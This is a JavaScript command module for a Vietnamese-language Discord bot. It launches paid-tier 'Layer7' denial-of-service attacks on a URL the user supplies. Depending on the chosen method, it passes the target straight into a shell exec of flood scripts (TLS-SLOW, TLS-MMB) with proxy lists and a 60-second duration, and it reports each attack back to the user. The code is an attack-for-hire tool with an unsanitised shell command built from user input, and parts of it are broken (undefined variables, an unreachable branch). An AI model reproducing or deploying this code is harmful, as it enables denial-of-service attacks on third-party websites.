const { doesNotReject } = require("assert");
const { MessageEmbed } = require("discord.js");
const { setFlagsFromString } = require("v8");
const ayarlar = require('../../ayarlar.json');
var version = ayarlar.versionbot;
var roleID3 = ayarlar.roleID3;
var img = ayarlar.img;
var photovip = ayarlar.photovip;
var randomgifvip = photovip[Math.floor((Math.random() * photovip.length))];
var Blacklists = ayarlar.blacklists;

module.exports = {
    name: 'mmb',
    description: 'Tấn công trang Web ( Layer7 )',
    type: 'CHAT_INPUT',
    cooldown: 90,
    options: [
    {
      name: "methods",
      description: "Phương pháp tấn công",
      required: true,
      type: "STRING",
      choices: [
      { name: `TLS-SLOW`, value: `TLS-SLOW`, inline: true },
      { name: `TLS-MMB`, value: `TLS-MMB`, inline: true },
      ],
    },
    {
      name: "host",
      description: "Địa chỉ tấn công",
      required: true,
      type: "STRING",
    },
  ],

  run: async (client, interaction) => {

    if (!interaction.member.roles.cache.has(roleID3))
      return interaction.reply({
        embeds: [
          new MessageEmbed()
          .setColor("RANDOM")
            .setDescription(`Chỉ có <@&${roleID3}> mới được dùng lệnh này.`)
            .setFooter({ text: "Made by idle" })
            .setTimestamp(),
        ], ephemeral: true 
      });
    const roommaster = ayarlar.commandroom.MASTER
    if (interaction.channel.id != roommaster)
      return interaction.reply({
        embeds: [
          new MessageEmbed()
          .setColor("RANDOM")
            .setDescription(`Chỉ dùng được lệnh này trong <#${roommaster}>.`)
            .setFooter({ text: "Made by idle", iconURL: img })
            .setTimestamp(),
        ], ephemeral: true 
      });

    const methods = interaction.options.getString("methods")
   const host = interaction.options.getString("host")
        const hostLink = /https?:\/\/(www\.)?[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&//=]*)/;
        if (!hostLink.test(host)) {
            interaction.reply({
            embeds: [
              new MessageEmbed()
                .setColor("RANDOM")
                .setTitle("Host không hợp lệ!")
                .setDescription("`Định dạng: https://www.example.com`")
                .setFooter({ text: "Made by idle", iconURL: img })
                .setTimestamp(),
            ], ephemeral: true 
          });
            return;
        }
        if (
          Blacklists.some((word) => interaction.toString().toLowerCase().includes(word))
        ) {
          interaction.reply({
            embeds: [
              new MessageEmbed()
                .setColor("RANDOM")
                .setDescription(
                  `${host} nằm trong danh sách đen nên không thể tấn công.`
                )
                .setFooter({
                  text: `Made by idle`,
                  iconURL: img,
                })
                .setTimestamp(),
              ], ephemeral: true,
          });
          return;
        }
    var photovip = ayarlar.photovip;
    var randomgif = photovip[Math.floor((Math.random() * photovip.length))];
if(methods === "TLS-SLOW") {
  var chetmemay = methods;

  var exec = require('child_process').exec
    exec(`node methods/mmb/${chetmemay}.js ${host} ${'60 5 5 proxy.txt GET'}`, (error, stdout, stderr) => {
    });

    console.log('Bắt đầu 1 cuộc tấn công Từ ID Discord:' +  interaction.guild.id)
    var randomgif = gifler[Math.floor((Math.random() * gifler.length))]
      const embed = new MessageEmbed()
        .setColor("RANDOM")
        .setTitle(version)
        .addFields(
          {
            name: "**`👨‍💻 Người Dùng:`**",
            value: `\n[ ${interaction.user.username} ]`,
            inline: false,
          },
          {
            name: "**`🔗 Host:`**",
            value: `\n[ ${host} ]`,
            inline: false,
          },
          {
            name: "**`💥 Phương Pháp:`**",
            value: `\n[ ${methods} ]`,
            inline: false,
          },
          {
            name: "**`🕒 Thời Gian:`**",
            value: `\n[ 60 second ]`,
            inline: false,
          },
          {
            name: "**`🔰 Mode:`**",
            value: `\n[ Layer7 ]`,
            inline: false,
          },
          {
            name: "**`💸 Plan:`**",
            value: `\n[ MMB ]`,
            inline: false,
          })
        .setImage(randomgifvip)
        .setFooter('Made by idle', img)
        .setTimestamp();
        const countdownEmbed = new MessageEmbed()
            .setColor('RANDOM')
            .setTitle(version)
            .setDescription("ĐANG KIỂM TRA...")  
            .setImage("https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif")         
            .setFooter('Made by idle', img)
            .setTimestamp()
          interaction.user.send({ embeds: [embed] }).then((message) => {
              setTimeout(function () {
                interaction.editReply({ embeds: [embed] });
              }, 1000)
            })
        }
        if(methods === "BROWSER-ENGINE") {
          var chetmemay = methods;
        
          var exec = require('child_process').exec
            exec(`node methods/mmb/${chetmemay}.js ${host} ${'60 5 5 proxy.txt GET'}`, (error, stdout, stderr) => {
            });
        
            console.log('Bắt đầu 1 cuộc tấn công Từ ID Discord:' +  interaction.guild.id)
            var randomgif = gifler[Math.floor((Math.random() * gifler.length))]
              const embed = new MessageEmbed()
                .setColor("RANDOM")
                .setTitle(version)
                .addFields(
                  {
                    name: "**`👨‍💻 Người Dùng:`**",
                    value: `\n[ ${interaction.user.username} ]`,
                    inline: false,
                  },
                  {
                    name: "**`🔗 Host:`**",
                    value: `\n[ ${host} ]`,
                    inline: false,
                  },
                  {
                    name: "**`💥 Phương Pháp:`**",
                    value: `\n[ ${methods} ]`,
                    inline: false,
                  },
                  {
                    name: "**`🕒 Thời Gian:`**",
                    value: `\n[ 60 second ]`,
                    inline: false,
                  },
                  {
                    name: "**`🔰 Mode:`**",
                    value: `\n[ Layer7 ]`,
                    inline: false,
                  },
                  {
                    name: "**`💸 Plan:`**",
                    value: `\n[ MMB ]`,
                    inline: false,
                  })
                .setImage(randomgifvip)
                .setFooter('Made by idle', img)
                .setTimestamp();
                  interaction.reply({ embeds: [embed] }).then((message) => {
                      setTimeout(function () {
                      }, 1000)
                    })
                }
        if(methods === "TLS-MMB") {
          var chetmemay = methods;
        
          var exec = require('child_process').exec
            exec(`node methods/mmb/${chetmemay}.js ${host} ${'60 120 5'}`, (error, stdout, stderr) => {
            });
        
            console.log('Bắt đầu 1 cuộc tấn công Từ ID Discord:' +  interaction.guild.id)
            var randomgif = gifler[Math.floor((Math.random() * gifler.length))]
              const embed = new MessageEmbed()
                .setColor("RANDOM")
                .setTitle(version)
                .addFields(
                  {
                    name: "**`👨‍💻 Người Dùng:`**",
                    value: `\n[ ${interaction.user.username} ]`,
                    inline: false,
                  },
                  {
                    name: "**`🔗 Host:`**",
                    value: `\n[ ${host} ]`,
                    inline: false,
                  },
                  {
                    name: "**`💥 Phương Pháp:`**",
                    value: `\n[ ${methods} ]`,
                    inline: false,
                  },
                  {
                    name: "**`🕒 Thời Gian:`**",
                    value: `\n[ 60 second ]`,
                    inline: false,
                  },
                  {
                    name: "**`🔰 Mode:`**",
                    value: `\n[ Layer7 ]`,
                    inline: false,
                  },
                  {
                    name: "**`💸 Plan:`**",
                    value: `\n[ MMB ]`,
                    inline: false,
                  })
                .setImage(randomgifvip)
                .setFooter('Made by idle', img)
                .setTimestamp();
                  interaction.user.send({ embeds: [embed] }).then((message) => {
                      setTimeout(function () {
                      }, 1000)
                    })
                }          
    }
}